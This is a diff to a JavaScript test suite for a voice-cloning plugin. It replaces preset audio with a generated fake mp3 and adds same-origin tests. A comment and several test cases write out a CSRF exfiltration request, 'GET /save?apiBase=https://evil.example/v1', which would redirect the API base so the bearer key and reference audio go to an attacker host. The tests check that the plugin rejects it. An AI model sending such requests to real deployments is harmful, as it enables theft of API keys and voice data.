@@ -31,6 +31,18 @@ globalThis.fetch = async () => {
 const dataDir = mkdtempSync(join(tmpdir(), 'auramimo-'))
 mkdirSync(join(dataDir, 'out'), { recursive: true })
 
+// 自带预设音频已从包里撤下（来源/授权无法核实），所以测试自己准备一段参考音频，
+// 模拟「用户上传过一段声音」。放在 dataDir/ref/ 下，和真实上传的落点一致。
+mkdirSync(join(dataDir, 'ref'), { recursive: true })
+{
+  // 拼一个够长的假 mp3：头部 + 若干静音帧，确保 base64 后长度足够触发「非空」断言
+  const head = Buffer.from([0x49, 0x44, 0x33, 0x03, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00]) // ID3v2.3 空标签
+  const body = Buffer.alloc(9000, 0x55)
+  globalThis.__testRefAudio = Buffer.concat([head, body])
+  const { writeFileSync } = await import('node:fs')
+  writeFileSync(join(dataDir, 'ref', 'ref.mp3'), globalThis.__testRefAudio)
+}
+
 const settings = {
   apiKey: 'sk-test-0000000000000000000000000000000000000000',
   apiBase: 'https://api.xiaomimimo.com/v1',
@@ -191,7 +203,7 @@ function captureFetch() {
 // --- 用例：API Key 只走 Authorization 头，不进请求体 ---
 {
   const calls = captureFetch()
-  settings.refAudio = 'preset:dafeiyu1.mp3'
+  settings.refAudio = 'ref.mp3'
   const r = await callRoute('/preview', { method: 'GET', url: '/preview?text=测试一句' })
   check('克隆：preview 合成成功', r.ok === true, JSON.stringify(r).slice(0, 80))
   check('克隆：只发一次请求', calls.length === 1, 'calls=' + calls.length)
@@ -204,12 +216,12 @@ function captureFetch() {
 // --- 用例：参考音频以 data:audio 塞进 audio.voice ---
 {
   const calls = captureFetch()
-  settings.refAudio = 'preset:dafeiyu1.mp3'
+  settings.refAudio = 'ref.mp3'
   await callRoute('/preview', { method: 'GET', url: '/preview?text=克隆链路检查二' })
   const body = calls[0]?.body || {}
   check('音色克隆：payload 有 audio 字段', Boolean(body.audio), Object.keys(body).join(','))
   check('音色克隆：audio.voice 是 data URI', String(body.audio?.voice || '').startsWith('data:audio/'))
-  check('音色克隆：参考音频非空', String(body.audio?.voice || '').length > 1000, 'len=' + String(body.audio?.voice || '').length)
+  check('音色克隆：参考音频非空', String(body.audio?.voice || '').length > 5000, 'len=' + String(body.audio?.voice || '').length)
   check('音色克隆：用 voiceclone 模型', String(body.model || '').includes('voiceclone'), String(body.model))
 }
 
@@ -255,6 +267,107 @@ function captureFetch() {
   const refDir = join(dataDir, 'ref')
   const files = existsSync(refDir) ? readdirSync(refDir).filter((n) => !n.startsWith('.')) : []
   check('上传参考音频：文件已落盘', files.length > 0, files.join(','))
+}
+
+
+// ==================== 同源校验（防跨站改写配置 / 读取声纹）====================
+//
+// 背景：DSH 的 csrfBlocked 只拦写方法的跨站请求，GET 一律放行。
+// 而 /save 原来在 body 为空时会回落到 query，于是
+//     GET /ext/aura-mimo/save?apiBase=https://evil.example/v1
+// 一条 URL 就能改掉 API 地址；之后任一次正常合成会把
+// Authorization: Bearer <真 Key> 和参考音频一起 POST 到攻击者地址。
+// /ref-audio 更是直接 GET 就能读出参考音频原文。
+
+// --- 写配置路由：GET 一律拒绝（这是外泄链的入口）---
+{
+  const oldBase = settings.apiBase
+  const r = await callRoute('/save', {
+    method: 'GET',
+    url: '/save?apiBase=https://evil.example/v1',
+  })
+  check('同源：GET /save 被拒绝', r.ok === false, JSON.stringify(r).slice(0, 90))
+  check('同源：GET /save 没有改掉 apiBase', settings.apiBase === oldBase, settings.apiBase)
+}
+
+// --- 写配置路由：跨站 Origin 被拒绝 ---
+{
+  const oldBase = settings.apiBase
+  const r = await callRoute('/save', {
+    method: 'POST',
+    headers: { origin: 'https://evil.example' },
+    body: JSON.stringify({ apiBase: 'https://evil.example/v1' }),
+  })
+  check('同源：跨站 Origin 的 POST /save 被拒绝', r.ok === false, JSON.stringify(r).slice(0, 90))
+  check('同源：跨站 POST 没有改掉 apiBase', settings.apiBase === oldBase)
+}
+
+// --- 写配置路由：跨站 Sec-Fetch-Site 被拒绝 ---
+{
+  const r = await callRoute('/save', {
+    method: 'POST',
+    headers: { 'sec-fetch-site': 'cross-site' },
+    body: JSON.stringify({ apiBase: 'https://evil.example/v1' }),
+  })
+  check('同源：Sec-Fetch-Site=cross-site 被拒绝', r.ok === false)
+}
+
+// --- 同源请求正常通过（不能把面板自己挡了）---
+{
+  const oldBase = settings.apiBase
+  const r = await callRoute('/save', {
+    method: 'POST',
+    headers: { origin: 'http://127.0.0.1:6180' },
+    body: JSON.stringify({ apiBase: 'https://api.xiaomimimo.com/v1' }),
+  })
+  check('同源：本机 Origin 的 POST 正常通过', r.ok === true, JSON.stringify(r).slice(0, 80))
+  settings.apiBase = oldBase
+}
+
+// --- 无 Origin 的非浏览器客户端放行（curl / 脚本不是 CSRF 载体）---
+{
+  const oldBase = settings.apiBase
+  const r = await callRoute('/save', {
+    method: 'POST',
+    headers: {},
+    body: JSON.stringify({ timeout: '180' }),
+  })
+  check('同源：无 Origin 的 POST 放行', r.ok === true, JSON.stringify(r).slice(0, 80))
+  settings.apiBase = oldBase
+}
+
+// --- /ref-audio：允许 GET，但跨站 Origin 要拒 ---
+{
+  settings.refAudio = 'ref.mp3'
+  const evil = await callRoute('/ref-audio', {
+    method: 'GET',
+    headers: { origin: 'https://evil.example' },
+  })
+  check('同源：跨站 GET /ref-audio 被拒绝', evil.ok === false, JSON.stringify(evil).slice(0, 90))
+  check('同源：跨站时没有返回音频', !evil.audio, String(evil.audio || '').slice(0, 20))
+
+  const same = await callRoute('/ref-audio', {
+    method: 'GET',
+    headers: { origin: 'http://127.0.0.1:6180' },
+  })
+  check(
+    '同源：本机 GET /ref-audio 正常返回',
+    same.ok === true && typeof same.audio === 'string' && same.audio.length > 0,
+    'ok=' + same.ok + ' len=' + String(same.audio || '').length + ' msg=' + String(same.message || '').slice(0, 60),
+  )
+}
+
+// --- /use-preset 与 /upload-ref 也要有闸 ---
+{
+  const a = await callRoute('/use-preset', { method: 'GET', url: '/use-preset?preset=dafeiyu1.mp3' })
+  check('同源：GET /use-preset 被拒绝', a.ok === false)
+
+  const b = await callRoute('/upload-ref', {
+    method: 'POST',
+    headers: { origin: 'https://evil.example' },
+    body: JSON.stringify({ name: 'x.mp3', data: tinyWav().toString('base64') }),
+  })
+  check('同源：跨站 POST /upload-ref 被拒绝', b.ok === false)
 }
 
 // --- 输出 ---
